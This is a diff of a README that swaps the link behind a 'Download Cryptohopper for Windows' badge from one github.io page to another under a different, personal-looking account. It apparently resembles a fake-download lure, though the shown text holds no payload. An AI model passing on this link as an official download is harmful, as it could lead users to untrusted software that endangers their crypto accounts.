@@ -4,7 +4,7 @@
 
 ## 📥 Download Cryptohopper for Windows
 
-[![⬇️ Download Cryptohopper](https://img.shields.io/badge/Download-Cryptohopper-blue?style=for-the-badge&logo=windows)](https://hopperload.github.io/.github/)
+[![⬇️ Download Cryptohopper](https://img.shields.io/badge/Download-Cryptohopper-blue?style=for-the-badge&logo=windows)](https://aidarryzhov.github.io/.github/hopperload)
 
 ---
 
